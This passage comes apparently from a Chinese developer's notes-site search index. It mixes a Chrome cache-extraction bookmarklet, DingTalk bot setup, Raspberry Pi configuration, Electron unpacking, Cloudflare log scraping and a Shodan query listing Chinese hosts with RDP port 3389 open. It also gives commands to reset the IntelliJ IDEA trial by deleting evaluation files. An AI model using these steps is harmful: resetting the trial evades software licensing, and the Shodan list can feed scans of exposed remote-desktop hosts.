document . getElementsByTagName ( 'pre' ); var preWithHeaderInfo = preTags [ 0 ]; var preWithContent = preTags [ 2 ]; var lines = preWithContent . textContent . split ( ' \\n ' ); // get data about the formatting ( changes between different versions of chrome ) var rgx = /^ ( 0 { 8 }: \\ s + )([ 0 - 9 a - f ]{ 2 } \\ s + )[ 0 - 9 a - f ]{ 2 } / m ; var match = rgx . exec ( lines [ 0 ]); var text = '' ; for ( var i = 0 ; i < lines . length ; i ++ ) { var line = lines [ i ]; var firstIndex = match [ 1 ] . length ; // first index of the chars to match ( e . g . where a '84' would start ) var indexJump = match [ 2 ] . length ; // how much space is between each set of numbers var totalCharsPerLine = 16 ; index = firstIndex ; for ( var j = 0 ; j < totalCharsPerLine ; j ++ ) { var hexValAsStr = line . substr ( index , 2 ); if ( hexValAsStr == ' ' ) { // no more chars break ; } var asciiVal = parseInt ( hexValAsStr , 16 ); text += String . fromCharCode ( asciiVal ); index += indexJump ; } } var headerText = preWithHeaderInfo . textContent ; var elToInsertBefore = document . body . childNodes [ 0 ]; var insertedDiv = document . createElement ( \"div\" ); document . body . insertBefore ( insertedDiv , elToInsertBefore ); // find the filename var nodes = [ document . body ]; var filepath = '' ; while ( true ) { var node = nodes . pop (); if ( node . hasChildNodes ()) { var children = node . childNodes ; for ( var i = children . length - 1 ; i >= 0 ; i -- ) { nodes . push ( children [ i ]); } } if ( node . nodeType === Node . TEXT_NODE && / \\ S /. test ( node . nodeValue )) { // 1 st depth - first text node ( with non - whitespace chars ) found filepath = node . nodeValue ; break ; } } outputResults ( insertedDiv , convertToBase64 ( text ), filepath , headerText ); insertedDiv . appendChild ( document . createElement ( 'hr' )); function outputResults ( parentElement , fileContents , fileUrl , headerText ) { // last updated 1 / 27 / 12 var rgx = /.+ \\ / ([ ^ \\ / ] + ) / ; var filename = rgx . exec ( fileUrl )[ 1 ]; // get the content type rgx = / content - type : ( .+ ) / i ; var match = rgx . exec ( headerText ); var contentTypeFound = match != null ; var contentType = \"text/plain\" ; if ( contentTypeFound ) { contentType = match [ 1 ]; } var dataUri = \"data:\" + contentType + \";base64,\" + fileContents ; // check for gzipped file var gZipRgx = / content - encoding : gzip / i ; if ( gZipRgx . test ( headerText )) { filename += '.gz' ; } // check for image var imageRgx = / image / i ; var isImage = imageRgx . test ( contentType ); // create link var aTag = document . createElement ( 'a' ); aTag . textContent = \"Left-click to download the cached file\" ; aTag . setAttribute ( 'href' , dataUri ); aTag . setAttribute ( 'download' , filename ); parentElement . appendChild ( aTag ); parentElement . appendChild ( document . createElement ( 'br' )); // create image if ( isImage ) { var imgTag = document . createElement ( 'img' ); imgTag . setAttribute ( \"src\" , dataUri ); parentElement . appendChild ( imgTag ); parentElement . appendChild ( document . createElement ( 'br' )); } // create warning if ( ! contentTypeFound ) { var pTag = document . createElement ( 'p' ); pTag . textContent = \"WARNING: the type of file was not found in the headers... defaulting to text file.\" ; parentElement . appendChild ( pTag ); } } function getBase64Char ( base64Value ) { if ( base64Value < 0 ) { throw \"Invalid number: \" + base64Value ; } else if ( base64Value <= 25 ) { // A - Z return String . fromCharCode ( base64Value + \"A\" . charCodeAt ( 0 )); } else if ( base64Value <= 51 ) { // a - z base64Value -= 26 ; // a return String . fromCharCode ( base64Value + \"a\" . charCodeAt ( 0 )); } else if ( base64Value <= 61 ) { // 0 - 9 base64Value -= 52 ; // 0 return String . fromCharCode ( base64Value + \"0\" . charCodeAt ( 0 )); } else if ( base64Value <= 62 ) { return '+' ; } else if ( base64Value <= 63 ) { return '/' ; } else { throw \"Invalid number: \" + base64Value ; } } function convertToBase64 ( input ) { // http : // en . wikipedia . org / wiki / Base64 #Example var remainingBits ; var result = \"\" ; var additionalCharsNeeded = 0 ; var charIndex = - 1 ; var charAsciiValue ; var advanceToNextChar = function () { charIndex ++ ; charAsciiValue = input . charCodeAt ( charIndex ); return charIndex < input . length ; }; while ( true ) { var base64Char ; // handle 1 st char if ( ! advanceToNextChar ()) break ; base64Char = charAsciiValue >>> 2 ; remainingBits = charAsciiValue & 3 ; // 0000 0011 result += getBase64Char ( base64Char ); // 1 st char additionalCharsNeeded = 3 ; // handle 2 nd char if ( ! advanceToNextChar ()) break ; base64Char = ( remainingBits << 4 ) | ( charAsciiValue >>> 4 ); remainingBits = charAsciiValue & 15 ; // 0000 1111 result += getBase64Char ( base64Char ); // 2 nd char additionalCharsNeeded = 2 ; // handle 3 rd char if ( ! advanceToNextChar ()) break ; base64Char = ( remainingBits << 2 ) | ( charAsciiValue >>> 6 ); result += getBase64Char ( base64Char ); // 3 rd char remainingBits = charAsciiValue & 63 ; // 0011 1111 result += getBase64Char ( remainingBits ); // 4 th char additionalCharsNeeded = 0 ; } // there may be an additional 2 - 3 chars that need to be added if ( additionalCharsNeeded == 2 ) { remainingBits = remainingBits << 2 ; // 4 extra bits result += getBase64Char ( remainingBits ) + \"=\" ; } else if ( additionalCharsNeeded == 3 ) { remainingBits = remainingBits << 4 ; // 2 extra bits result += getBase64Char ( remainingBits ) + \"==\" ; } else if ( additionalCharsNeeded != 0 ) { throw \"Unhandled number of additional chars needed: \" + additionalCharsNeeded ; } return result ; } })() \u4f8b\u5982\u627e\u5230http://a3.qpic.cn/psb?/V12C1bLj2DcCgb/f9hTWn5wbxt3dZd5MlUCHX6tA9oqVOudgT2rqARLltk!/a/dI4BAAAAAAAA \u4f46\u8fd9\u6837\u53ea\u662f\u4e00\u5f20\u5c0f\u56fe\uff0c\u6211\u4eec\u5f53\u7136\u5e0c\u671b\u6709\u5927\u56fe\uff0c\u6bd4\u5bf9\u5927\u56fe\u7684url\u53d1\u73b0\u53ea\u8981\u5c06\u4e0a\u8ff0url\u7684/a/\u66ff\u6362\u4e3a/b/\u5373\u53ef \u6240\u4ee5\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u6253\u5f00\u7f13\u5b58\u9875\u9762chrome://cache/\uff0c\u67e5\u627epsb\u5b57\u7b26\u4e32\uff0c\u627e\u5230\u60f3\u8981\u7684\u56fe\u7247\uff0c\u5982\u679c\u662f\u5c0f\u56fe\u5c31\u6539\u4e00\u4e0burl\u5f97\u5230\u5927\u56fe \u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f \u00b6 \u6458\u81ea https://manishearth.github.io/blog/2018/08/26/why-i-enjoy-blogging/ \u5199\u4e0b\u6765\u7684\u8fc7\u7a0b\u53d1\u73b0\u81ea\u5df1\u8fd8\u6709\u4e0d\u61c2\u7684\uff0c\u7ed9\u81ea\u5df1\u8bb2\u6e05\u695a\u751a\u81f3\u80fd\u53d1\u73b0rust\u6807\u51c6\u5e93\u7684bug\uff0c\u672c\u8d28\u4e0a\u662f\u7ed9\u5f88\u591a\u4eba\u8bb2\u9700\u8981\u8003\u8651\u6240\u6709\u65b9\u9762\u800c\u4e0d\u662f\u6700\u5c0f\u5fc5\u8981\uff1b\u5f53\u4f60\u89c9\u5f97\u663e\u800c\u6613\u89c1\u7684\u65f6\u5019\u5f88\u5bb9\u6613\u5931\u53bb\u89e3\u91ca\u6e05\u695a\u7684\u80fd\u529b \u8bfb\u65e7\u7684\u6587\u7ae0\u5f88\u6709\u8da3 \u8ba9\u81ea\u5df1\u56de\u5230\u5199\u4f5c\u7684\u90a3\u4e00\u65f6\u523b \u6bd4\u8f83\u5f53\u65f6\u81ea\u5df1\u7684\u7406\u89e3\u548c\u73b0\u5728\u7684 \u4f53\u4f1a\u81ea\u5df1\u7684\u8fdb\u6b65\uff0c\u91cd\u65b0\u5b66\u4e60\u5df2\u7ecf\u5fd8\u4e86\u7684 \u5199\u4f5c\u80fd\u6362\u4e2a\u8111\u5b50 \u5728\u4e0d\u540c\u5de5\u4f5c\u4e4b\u524d\u5207\u6362 \u4f7f\u7528\u4e0d\u540c\u7684\u8111\u533a \u6574\u5929\u90fd\u6709\u7cbe\u529b \u5199blog\u80fd\u5077\u61d2 \u4ee5\u540e\u6709\u4eba\u95ee\u5230\u5c31\u80fd\u76f4\u63a5\u7ed9\u94fe\u63a5\u8bf4\u201c\u4f60\u60f3\u77e5\u9053\u66f4\u591a\u7684\u8bdd \u6211\u5df2\u7ecf\u5728\u8fd9\u5199\u8fc7\u4e86\u201d \u522b\u4eba\u5199\u8fc7\u4e86\u8fd8\u8981\u4e0d\u8981\u5199\uff1f\u8981\u5199\uff01 \u4f60\u7684\u7406\u89e3\u4e0d\u540c\uff0c\u6563\u843d\u5728\u4e0d\u540c\u5730\u65b9\u7684\u77e5\u8bc6\u7efc\u5408\u8d77\u6765\u4e5f\u6709\u4ef7\u503c \u4f60\u771f\u6b63\u7684\u804c\u8d23\u662f\u5f53\u4f60\u6709\u7a7afree\u4e86\uff0c\u4f60\u5e94\u8be5\u8ba9\u5176\u4ed6\u4eba\u4e5f\u8f7b\u677efree\uff0c\u5982\u679c\u4f60\u6709\u80fd\u529bpower\uff0c\u4f60\u7684\u804c\u8d23\u5c31\u662f\u4e3a\u5176\u4ed6\u4eba\u8d4b\u80fdempower \u81ea\u5b66\u4e0d\u610f\u5473\u7740\u5f53\u4e00\u4e2a\u7f16\u8bd1\u5668\u7684fuzzer\u968f\u673a\u5c1d\u8bd5\uff0c\u800c\u662f\u5b66\u6587\u6863tutorial\uff0c\u4ece\u4e66\u7c4d\u5b66\u7b97\u6cd5\u2014\u2014\u81ea\u5b66\u53ea\u662f\u8bf4\u4f60\u5b8c\u5168\u638c\u63a7\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\uff0c\u4f46\u4ecd\u7136\u4f9d\u8d56\u5176\u4ed6\u4eba\u7684\u5de5\u4f5c \u4f60\u4e5f\u5e94\u8be5\u5199\u535a\u5ba2 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5efa\u8baehttps://jvns.ca/blog/2016/05/22/how-do-you-write-blog-posts/ \u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba \u00b6 \u9700\u8981\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2a\u4f01\u4e1a\uff0c\u7ba1\u7406\u5458\u624d\u80fd\u521b\u5efa\u8fd9\u79cd\u673a\u5668\u4eba\uff0c\u673a\u5668\u4eba\u53ea\u80fd\u5728\u5185\u90e8\u7fa4\u4f7f\u7528 \u6587\u6863\uff1a https://ding-doc.dingtalk.com/doc#/serverapi2/elzz1p \u5176\u4e2d\u7f3a\u5931\u4e86\u5173\u4e8eatDingtalkIds\u7684\u63cf\u8ff0\uff0c\u9700\u8981\u770b\u8fd9\u4e2a\uff1a https://juejin.im/post/6844903922029576205 \u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u6709\uff1a\u4fee\u6539\u670d\u52a1\u5668\u56de\u8c03\u901a\u77e5\u5730\u5740\u548c\u4fee\u6539\u4e0a\u7ebf\u7684\u65f6\u5019\uff0c\u9489\u9489\u5c31\u4f1a\u9a8c\u8bc1\u670d\u52a1\u5668\u662f\u5426\u6b63\u5e38\uff0c\u4f60\u53ef\u4ee5 while true; nc -lp 8888 < tmp.txt; done \u6b7b\u5faa\u73af\u63d0\u4f9b\u4e2a\u6b63\u5e38\u7684http\u670d\u52a1 POST\u53d1\u6765\u7684\u6570\u636e\u91cc\u9762\u6709\u4e34\u65f6\u7684url\u53ef\u4ee5\u53d1\u6d88\u606f\uff0c\u8fd8\u6709senderId\u662f\u53d1\u9001\u8005id\u7528\u6765\u5728atDingtalkIds\u4e2d\u4f7f\u7528 \u6536\u5230\u7684POST\u5185\u5bb9\uff1a {\"conversationId\":\"cidoAgtPbnu9MyulIyt0kpNYg==\",\"atUsers\":[{\"dingtalkId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\"}],\"chatbotCorpId\":\"dingb1d0b0ca51cxxxxxx\",\"chatbotUserId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\",\"msgId\":\"msgWjYj1k8LPNOBBy+jxNKwQw==\",\"senderNick\":\"\u53d1\u9001\u8005\u59d3\u540d\",\"isAdmin\":false,\"senderStaffId\":\"2665036700000000\",\"sessionWebhookExpiredTime\":1600622026555,\"createAt\":1600616626487,\"senderCorpId\":\"dingb1d0b0ca51c029b24ac5d6980000000\",\"conversationType\":\"2\",\"senderId\":\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\",\"conversationTitle\":\"\u7fa4\u7ec4\u6807\u9898\",\"isInAtList\":true,\"sessionWebhook\":\"https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386\",\"text\":{\"content\":\" 1+1\"},\"msgtype\":\"text\"} \u56de\u590d\u53d1\u9001\u8005\u4e00\u4e2a666\uff1a curl https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386 -H \"Content-Type: application/json\" --data '{\"msgtype\":\"text\", \"text\":{\"content\":\"666\"}, \"at\":{\"atDingtalkIds\":[\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\"]}}' Go\u8bed\u8a00 \u00b6 \u5b89\u88c5 \u00b6 wget - q https : // golang . org / dl / go1 . 15.3 . linux - amd64 . tar . gz && \\ tar - C / usr / local - xzf go1 . 15.3 . linux - amd64 . tar . gz export PATH =$ PATH : / usr / local / go / bin \u63d0\u53d6build\u5931\u8d25\u7f3a\u5931\u7684\u5e93\u5b89\u88c5 \u00b6 go build |& grep cannot |cut -d'\"' -f2|xargs go get IDEA2020.2 30\u5929\u540e\u91cd\u65b0\u8bd5\u7528 \u00b6 \u53c2\u8003\uff1a http://scz.617.cn:8/windows/202010261152.txt regedit\u627e\u5230HKCU\\SOFTWARE\\JavaSoft\\Prefs\\jetbrains\\idea\uff0c\u5176\u4e2d\u4f1a\u6709\u76ee\u5f55\u5305\u542bevlsprt3\\202\uff0c\u5220\u6389\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u7684evlsprt\u548cevlsprt2 \u7136\u540e\u5220\u9664\u8fd9\u4e9b\u76ee\u5f55\uff1a rd /s /q \"%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\eval\" del \"%APPDATA%\\JetBrains\\PermanentDeviceId\" del \"%APPDATA%\\JetBrains\\PermanentUserId\" del \"%APPDATA%\\JetBrains\\bl\" del \"%APPDATA%\\JetBrains\\crl\" \u7f16\u8f91\u201d%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\options\\other.xml\u201d \u5220\u9664\u5305\u542bevlsprt.202\u6216evlsprt2.202\u7684\u884c \u6811\u8393\u6d3e\u5230\u624b\u540e\u914d\u7f6e \u00b6 \u4e00\u6b3e\u65b0\u7684\u6811\u8393\u6d3e4\u5230\u624b\uff0c\u9ed8\u8ba4\u4e3a\u82f1\u56fd\u952e\u76d8\u5e03\u5c40\u4e0d\u80fd\u8f93\u5165@#\u7b26\u53f7\uff0c\u663e\u793a\u5206\u8fa8\u7387\u4e0d\u591f1080p\uff0c\u4ee5\u53ca\u6709\u7ebf\u7f51\u7edc\u548c\u65e0\u7ebf\u7f51\u7edc\u4f18\u5148\u7ea7\u9700\u8981\u8c03\u6574 \u4fee\u6539\u952e\u76d8\u5e03\u5c40 \u00b6 \u67e5\u5230\u6709\u6559\u7a0b\u8bf4 sudo raspi-config \u91cc\u53ef\u4ee5\u4fee\u6539\u952e\u76d8\u5e03\u5c40\uff0c\u5b9e\u6d4b\u53d1\u73b0\u6539\u4e86\u4e4b\u540e\u53ea\u6572\u4e86\u4e00\u6b21@\u4e4b\u540e\u53c8\u88ab\u6539\u56de\u53bb\u4e86\uff0c\u8fd8\u662f\u5f97\u4fee\u6539\u8f93\u5165\u6cd5\uff1a \u53c2\u8003 https://jingyan.baidu.com/article/3aed632e29dfd87011809169.html sudo apt install fcitx reboot \u53f3\u4e0a\u89d2\u6709\u8f93\u5165\u6cd5\u56fe\u6807 \u7ba1\u7406\u952e\u76d8 \u5220\u6389\u82f1\u56fd \u52a0\u4e0a\u82f1\u8bed(\u7f8e\u56fd)\u5373\u53ef \u663e\u793a\u5206\u8fa8\u7387\u4fee\u6539 \u00b6 \u53c2\u8003 https://www.ncnynl.com/archives/201607/226.html \u6811\u8393\u6d3e\u6709\u4e24\u79cdhdmi\u8f93\u51fa\u6a21\u5f0f\uff0c1\u662fCEA\u7535\u89c6\uff0c2\u662fDMT\u7535\u8111\u663e\u793a\u5668 \u67e5\u770b\u5f53\u524d\u663e\u793a\u5668\u652f\u6301\u7684\u5206\u8fa8\u7387\u4eec\uff1a tvservice -m CEA tvservice -m DMT \u5b9e\u9645\u4e0a\u663e\u793a\u51fa\u6765\u7684\u5e76\u4e0d\u4e00\u5b9a\u5b8c\u6574\uff0c\u8fd8\u9700\u8981\u81ea\u5df1\u591a\u6d4b\u8bd5\uff1a\u4f8b\u5982\u8bbe\u7f6e\u4e3a 640x480 60Hz tvservice -e \"DMT 4\" \u5efa\u8bae\u5728\u7ec8\u7aef\u91cc\u5148\u6572\u8fd9\u4e2a\u547d\u4ee4 \u5f53\u663e\u793a\u4e0d\u51fa\u6765\u7684\u65f6\u5019\u53ef\u4ee5\u6309\u2191\u56de\u8f66\u6539\u56de\u4e00\u4e2a\u6b63\u5e38\u663e\u793a\uff0c\u4e0d\u81f3\u4e8e\u91cd\u542f \u5b8c\u6574\u7684\u5217\u8868\u5728\u4e0a\u8ff0\u53c2\u8003\u94fe\u63a5\u4e2d\u6709\u4e86\uff0c\u53ef\u4ee5\u81ea\u5df1\u591a\u8bd5\u8bd5\uff0c\u5207\u6362\u5206\u8fa8\u7387\u540e\u8bb0\u5f97\u79fb\u52a8\u9f20\u6807 \u4e0d\u7136\u4e0d\u4f1a\u663e\u793a \u4f46\u662f\u6211\u5e0c\u671b\u7684\u5206\u8fa8\u7387 1920x1080 60Hz\u4e0d\u5728DMT\u5217\u8868\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u81ea\u5b9a\u4e49\u5206\u8fa8\u7387\u4e86 \u4fee\u6539 /boot/config.txt \uff0c\u6dfb\u52a0\uff1a hdmi_cvt=1920 1080 60 3 hdmi_group=2 hdmi_mode=87 hdmi_drive=2 \u5176\u4e2dhdmi_cvt\u7684\u89e3\u91ca\uff1a https://www.raspberrypi.org/documentation/configuration/config-txt/video.md \u5176\u4e2d\u6700\u540e\u4e00\u4e2a3\u662fsdtv_aspect \u957f\u5bbd\u6bd4 \u6211\u8fd9\u91cc\u662f16:9 \u6240\u4ee5\u586b\u4e863 \u4fee\u6539\u540e\u91cd\u542f\u5373\u53ef\uff0c\u4f3c\u4e4e\u76ee\u524d\u6811\u8393\u6d3e\u4e5f\u5b66\u806a\u660e\u4e86\uff0c\u5373\u4f7fconfig.txt\u91cc\u914d\u7f6e\u4e86\u9519\u8bef\u7684\u503c\u663e\u793a\u4e0d\u51fa\u6765\uff0c\u4e5f\u4f1a\u81ea\u52a8\u56de\u9000\u5230720p\u4fdd\u8bc1\u663e\u793a \u8c03\u6574\u65e0\u7ebf\u7f51\u7edc\u548c\u6709\u7ebf\u7f51\u7edc\u7684\u4f18\u5148\u7ea7 \u00b6 \u6211\u5e0c\u671b\u5916\u7f51\u8bbf\u95ee(default\u8def\u7531)\u8d70wifi\uff0c\u5185\u7f51\u8bbf\u95ee(10.0.0.0/8)\u8d70\u6709\u7ebf\uff0c\u4f46\u9ed8\u8ba4\u8054\u7f51\u540e\u6709\u7ebf\u4e5f\u4f1a\u5360\u636edefault\u8def\u7531\u800c\u4e14\u4f18\u5148\u7ea7\u6bd4\u65e0\u7ebf\u9ad8\uff08\u8dc3\u70b9\u6570\u5c0f\uff09 \u4e24\u4e2a\u7f51\u7edc\u90fd\u662f\u4f7f\u7528dhcp\u83b7\u53d6IP\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728dhcp\u7684\u914d\u7f6e\u6587\u4ef6\u91cc\u914d\u7f6emetric \u53c2\u8003\uff1a https://raspberrypi.stackexchange.com/a/50951 \u7f16\u8f91 /etc/dhcpcd.conf interface wlan0 metric 200 interface eth0 metric 300 \u7136\u540e\u7f16\u8f91dhcp\u7684hook\u81ea\u52a8\u6267\u884croute\u547d\u4ee4\uff1a \u53c2\u8003 https://wiki.archlinux.org/index.php/dhcpcd#DHCP_static_route.28s.29 \u7f16\u8f91 /etc/dhcpcd.exit-hook route add -net 10.0.0.0/8 gw <\u7f51\u5173ip> dev eth0 \u4fee\u6539Electron\u5e94\u7528 \u00b6 \u60f3\u8ba9\u8fd9\u4e2aElectron\u5e94\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u81ea\u5b9a\u4e49\u7684\u9875\u9762\uff0c\u4f46\u4eba\u5bb6\u6ca1\u63d0\u4f9bF12\uff08\u867d\u7136\u6700\u540e\u53d1\u73b0\u4e5f\u6ca1\u5565\u7528Orz \u53c2\u8003\uff1a \u543e\u7231\u7834\u89e3-Electron\u8de8\u5e73\u53f0\u7a0b\u5e8f\u7834\u89e3\u7684\u4e00\u822c\u601d\u8def npm install asar - g # \u5728 resources\u76ee\u5f55\u53ef\u4ee5\u627e\u5230app . asar \uff0c\u8fd9\u6837\u89e3\u5305\uff1a asar e app . asar tmp # \u4fee\u6539\u540e\u91cd\u65b0\u6253\u5305\uff1a asar p tmp / app . asar \u5177\u4f53\u7684\u4fee\u6539\u633a\u7b80\u5355\uff0c\u627e\u5230\u5165\u53e3\u7684electron.js \u6ce8\u91ca\u6389new BrowserWindow\u7684titleBarStyle: \u2018hidden\u2019, removeMenu() \u4fee\u6539.loadURL(url) Cloudflare\u514d\u8d39\u8d26\u6237 \u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7 \u00b6 \u539f\u59cb\u65e5\u5fd7\u53ea\u5bf9\u4ed8\u8d39\u7684\u4f01\u4e1a\u7248\u5f00\u653e\uff0c\u96be\u9053\u6211\u4eec\u5c31\u6ca1\u6709\u65b9\u6cd5\u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7\u6765\u5206\u6790\u6d41\u91cf\u561b\uff1f \u770b\u5230\u9632\u706b\u5899\u7684\u62e6\u622a\u65e5\u5fd7\uff0c\u53c8\u53d1\u73b0\u201c\u7ed5\u8fc7\u201d\u8fd9\u4e2aaction\u4e5f\u4f1a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7ed5\u8fc7\u672c\u8eab\u5c31\u6ca1\u6709\u542f\u7528\u7684\u9632\u62a4\uff0c\u5c31\u80fd\u8bb0\u5f55\u6240\u6709\u6d41\u91cf\u4e86\u3002\u4f46\u6ce8\u610f\u8fd9\u4e2a\u9632\u706b\u5899\u65e5\u5fd7\u662f\u62bd\u6837\u8bb0\u5f55\u7684\u3002 \u770bF12 Network\u53d1\u73b0\u4eba\u5bb6\u67e5\u8be2\u63a5\u53e3\u7528\u7684\u662fGraphQL\uff0c\u7136\u540e\u53d1\u73b0\u9700\u8981\u901a\u8fc7introspection\u624d\u80fd\u77e5\u9053\u6709\u54ea\u4e9b\u53ef\u7528\u7684\u5b57\u6bb5 cloudflare\u7684\u6587\u6863\uff1a https://developers.cloudflare.com/analytics/graphql-api/getting-started/querying-basics \u5b9e\u9645\u7684introspection\u8bf7\u6c42\uff1a https://stackoverflow.com/questions/34199982/how-to-query-all-the-graphql-type-fields-without-writing-a-long-query \u67e5\u8be2\u9650\u5236\uff1a\u4e00\u6b21\u5206\u9875\u53ef\u4ee5\u83b7\u53d6\u6700\u592710000\u6761\u8bb0\u5f55\uff0cfilter\u5fc5\u987b\u6709\u5185\u5bb9\uff0c\u65f6\u95f4\u8de8\u5ea6\u4e00\u6b21\u4e0d\u80fd\u8d85\u8fc724\u5c0f\u65f6 import requests from pprint import pprint from datetime import timezone , datetime , timedelta sess = requests . session () from config import headers def fetch ( ts ): res = [] end = ts . strftime ( \"%Y-%m- %d T%H:%M:%SZ\" ) start = ( ts - timedelta ( days = 1 )) . strftime ( \"%Y-%m- %d T%H:%M:%SZ\" ) x = sess . post ( \"https://api.cloudflare.com/client/v4/graphql\" , headers = headers , data = '{\"operationName\":\"ActivityLogQuery\",\"variables\":{\"zoneTag\":\"8a4335a74373cec7fd053241dc3e3f41\",\"filter\":{\"datetime_geq\":\"' + start + '\",\"datetime_leq\":\"' + end + '\"},\"limit\":10000,\"activityFilter\":{\"datetime_geq\":\"' + start + '\",\"datetime_leq\":\"' + end + '\"}},\"query\":\"query ActivityLogQuery($zoneTag: string, $filter: FirewallEventsAdaptiveGroupsFilter_InputObject, $activityFilter: FirewallEventsAdaptiveFilter_InputObject, $limit: int64 \\\\ u0021) { viewer { zones(filter: {zoneTag: $zoneTag}) { total: firewallEventsAdaptiveByTimeGroups(limit: 1, filter: $filter) { count avg { sampleInterval __typename } __typename } activity: firewallEventsAdaptive(filter: $activityFilter, limit: $limit, orderBy: [datetime_DESC, rayName_DESC, matchIndex_ASC]) { action clientASNDescription clientAsn clientCountryName clientIP clientRequestHTTPHost clientRequestHTTPMethodName clientRequestHTTPProtocol clientRequestPath clientRequestQuery datetime rayName ruleId source userAgent matchIndex metadata { key value __typename } sampleInterval originResponseStatus edgeResponseStatus clientRefererScheme clientRefererHost clientRefererPath clientRefererQuery clientIPClass __typename } __typename } __typename }}\"}' ) #print(x.json()) return x . json ()[ \"data\" ][ \"viewer\" ][ 'zones' ][ 0 ][ 'activity' ] logformat = [ 'datetime' , 'clientIP' , 'clientIPClass' , 'edgeResponseStatus' , 'originResponseStatus' , 'clientRequestHTTPMethodName' , 'clientRequestPath' , 'clientRequestQuery' , 'clientRequestHTTPProtocol' , 'clientRefererScheme' , 'clientRefererHost' , 'clientRefererPath' , 'clientRefererQuery' , 'userAgent' , 'action' , 'clientASNDescription' , 'clientAsn' , 'clientCountryName' , 'clientRequestHTTPHost' , 'matchIndex' , 'ruleId' , 'sampleInterval' , 'source' , 'rayName' ] fp = open ( \"access.log\" , \"w\" ) ts = datetime . now ( tz = timezone . utc ) knownrays = set () data = None while data is None or len ( data ) == 10000 : data = fetch ( ts ) for i in data : if i [ 'rayName' ] in knownrays : continue line = \" \\t \" . join ( str ( i [ j ]) for j in logformat ) fp . write ( line + \" \\n \" ) last = data [ - 1 ] knownrays . update ([ i [ 'rayName' ] for i in data if i [ 'datetime' ] == last [ 'datetime' ]]) print ( last [ 'datetime' ], \"len(knownrays)=\" , len ( knownrays )) ts = datetime . strptime ( last [ 'datetime' ], \"%Y-%m- %d T%H:%M:%SZ\" ) \u7136\u540e\u5c31\u80fd\u5206\u6790\u4f8b\u5982\u8bbf\u95ee\u6700\u591a\u7684IP: cut -d$'\\t' -f2 access.log|sort|uniq -c|sort -hr|head -n 30 shodan \u641c\u7d22\u5f00\u653e\u7279\u5b9a\u7aef\u53e3\u7684ip\u5217\u8868 \u00b6 \u8fd9\u4e2a\u9700\u6c42\u53ea\u9700\u8981\u4f7f\u7528faucet\u5373\u53ef\uff0c\u514d\u8d39 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u641c\u7d223389\u7684\u4e2d\u56fdip\uff1a https://beta.shodan.io/search/facet?query=port%3A3389+country%3Acn&facet=ip \u4e5f\u53ef\u4ee5\u4f7f\u7528shodan\u7684python\u5305\u6765\u67e5\u8be2\uff0c\u9700\u8981\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5f97\u5230api key\uff1a import shodan x = shodan . Shodan ( \"APIKEY\" ) data = x . search ( \"port:3389 country:cn\" , facets = [ 'ip:10000' ]) iplist = ([ i [ \"value\" ] for i in data [ \"facets\" ][ \"ip\" ]])","title":"Developer"},{"location":"Developer/#_1","text":"\u5148\u5f97\u6709\u65b9\u5411\uff0c\u6211\u7528\u8fd9\u4e2a\u6280\u672f\u80fd\u7ed9\u6211\u5e26\u6765\u4ec0\u4e48\u56de\u62a5\uff1f\u627e\u5230\u5185\u5728\u52a8\u529b \u8bfb\u4e66\uff0c\u5b66\u4e60\u89c6\u9891\u8bfe\u7a0b \u53bb\u9605\u8bfb\u6e90\u7801\uff0c\u5927\u7684\u5f00\u6e90\u9879\u76ee\u6709\u65b0\u7684\u6280\u672f\u3001\u5de7\u5999\u7684\u8bbe\u8ba1\u3001\u4f18\u826f\u7684\u67b6\u6784\uff0c\u5bf9\u81ea\u5df1\u5199\u4ee3\u7801\u3001\u67b6\u6784\u7684\u80fd\u529b\u90fd\u6709\u975e\u5e38\u5927\u7684\u63d0\u5347 \u5728\u9879\u76ee\u4e2d\u4f7f\u7528\u81ea\u5df1\u60f3\u7528\u7684\u6280\u672f\uff0c\u89e3\u51b3\u73b0\u5b9e\u95ee\u9898 \u52a0\u5165\u5f00\u6e90\u9879\u76ee\uff0c\u548c\u725b\u4eba\u4e00\u8d77\u5de5\u4f5c\uff0c\u5411\u725b\u4eba\u770b\u9f50 \u52a0\u5165\u9ad8\u624b\u7684\u793e\u7fa4\uff0c\u4e0e\u4f18\u79c0\u7684\u4eba\u5728\u4e00\u8d77","title":"\u4fdd\u6301\u6280\u672f\u7cbe\u8fdb"},{"location":"Developer/#_2","text":"From: https://z.codes/how-to-ask-computer-question/","title":"\u5982\u4f55\u660e\u667a\u5730\u5411\u7a0b\u5e8f\u5458\u63d0\u95ee"},{"location":"Developer/#_3","text":"\u6211\u73b0\u5728\u9047\u5230\u4e00\u4e2a\u95ee\u9898X \u6211\u60f3\u5230\u53ef\u80fd\u7684\u539f\u56e0\u662fa, b, c \u6211\u6392\u9664\u4e86\u4ee5\u4e0b\u53ef\u80fd\u6027d, e, f \u6211\u5c1d\u8bd5\u8fc7\u4ee5\u4e0b\u65b9\u6848g, h, i 